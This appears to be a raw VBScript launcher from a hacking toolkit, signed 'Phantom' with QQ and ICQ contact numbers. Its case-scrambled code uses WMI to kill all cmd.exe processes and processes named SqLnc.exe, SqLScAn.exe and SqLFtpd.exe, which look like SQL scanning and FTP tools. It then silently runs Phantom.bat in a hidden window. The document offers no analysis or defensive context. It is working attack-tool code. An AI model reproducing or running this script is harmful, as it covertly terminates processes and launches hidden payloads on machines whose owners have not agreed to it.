'做人就要像亦君和志高一样，有节有情。
'QQ:4581809 && ICQ:332954794
'By 扯线木偶: Phantom
On error resume next

StRcOmpUtER = "."
SEt OBjwmiSERvicE = gEtOBjEct("winmgmtS:" & "{impERSOnAtiOnLEvEL=impERSOnAtE}!\\" & StRcOmpUtER & "\ROOt\cimv2")
SEt cOLpROcESSLiSt = OBjwmiSERvicE.ExEcqUERY ("SELEct * FROm win32_pROcESS whERE nAmE ='cmd.ExE'")
FOR EAch OBjpROcESS in cOLpROcESSLiSt
OBjpROcESS.tERminAtE()
wScRipt.SLEEp 100
nExt

StRcOmpUtER = "."
SEt OBjwmiSERvicE = gEtOBjEct("winmgmtS:" & "{impERSOnAtiOnLEvEL=impERSOnAtE}!\\" & StRcOmpUtER & "\ROOt\cimv2")
SEt cOLpROcESSLiSt = OBjwmiSERvicE.ExEcqUERY ("SELEct * FROm win32_pROcESS whERE nAmE ='SqLnc.ExE'")
FOR EAch OBjpROcESS in cOLpROcESSLiSt
OBjpROcESS.tERminAtE()
wScRipt.SLEEp 100
nExt

StRcOmpUtER = "."
SEt OBjwmiSERvicE = gEtOBjEct("winmgmtS:" & "{impERSOnAtiOnLEvEL=impERSOnAtE}!\\" & StRcOmpUtER & "\ROOt\cimv2")
SEt cOLpROcESSLiSt = OBjwmiSERvicE.ExEcqUERY ("SELEct * FROm win32_pROcESS whERE nAmE ='SqLScAn.ExE'")
FOR EAch OBjpROcESS in cOLpROcESSLiSt
OBjpROcESS.tERminAtE()
wScRipt.SLEEp 100
nExt

StRcOmpUtER = "."
SEt OBjwmiSERvicE = gEtOBjEct("winmgmtS:" & "{impERSOnAtiOnLEvEL=impERSOnAtE}!\\" & StRcOmpUtER & "\ROOt\cimv2")
SEt cOLpROcESSLiSt = OBjwmiSERvicE.ExEcqUERY ("SELEct * FROm win32_pROcESS whERE nAmE ='SqLFtpd.ExE'")
FOR EAch OBjpROcESS in cOLpROcESSLiSt
OBjpROcESS.tERminAtE()
wScRipt.SLEEp 100
nExt

Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd.exe /c Phantom.bat", 0
Set WshShell = Nothing